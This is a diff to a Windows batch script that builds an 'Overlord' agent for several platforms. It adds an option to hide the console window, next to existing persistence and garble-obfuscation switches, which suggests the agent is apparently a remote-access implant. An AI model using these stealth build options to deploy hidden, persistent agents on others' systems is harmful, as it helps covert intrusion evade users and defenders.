@@ -4,8 +4,9 @@ set ROOT=%~dp0
 set CLIENT_DIR=%ROOT%Overlord-Client
 set OUT_DIR=%ROOT%dist-clients
 
-set ENABLE_PERSISTENCE=false
-set OBFUSCATE=false
+if not defined ENABLE_PERSISTENCE set ENABLE_PERSISTENCE=false
+if not defined OBFUSCATE set OBFUSCATE=false
+if not defined HIDE_CONSOLE set HIDE_CONSOLE=false
 
 set "GARBLE_FLAGS="
 
@@ -34,6 +35,12 @@ if not "%CLIENT_COUNTRY%"=="" (
 
 echo LDFLAGS: %LDFLAGS%
 
+set "WIN_LDFLAGS="
+if "%HIDE_CONSOLE%"=="true" (
+    echo Windows console hidden (GUI subsystem)
+    set "WIN_LDFLAGS=-H=windowsgui"
+)
+
 set "BUILD_CMD=go build"
 if "%OBFUSCATE%"=="true" (
     where garble >nul 2>&1
@@ -52,14 +59,14 @@ echo == Building agent for windows amd64 ==
 set GOOS=windows
 set GOARCH=amd64
 set CGO_ENABLED=0
-%BUILD_CMD% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-windows-amd64.exe" ./cmd/agent
+%BUILD_CMD% -ldflags="%LDFLAGS% %WIN_LDFLAGS%" -o "%OUT_DIR%\agent-windows-amd64.exe" ./cmd/agent
 if errorlevel 1 goto :err
 
 echo == Building agent for windows arm64 ==
 set GOOS=windows
 set GOARCH=arm64
 set CGO_ENABLED=0
-%BUILD_CMD% -ldflags="%LDFLAGS%" -o "%OUT_DIR%\agent-windows-arm64.exe" ./cmd/agent
+%BUILD_CMD% -ldflags="%LDFLAGS% %WIN_LDFLAGS%" -o "%OUT_DIR%\agent-windows-arm64.exe" ./cmd/agent
 if errorlevel 1 goto :err
 
 echo == Building agent for linux amd64 ==
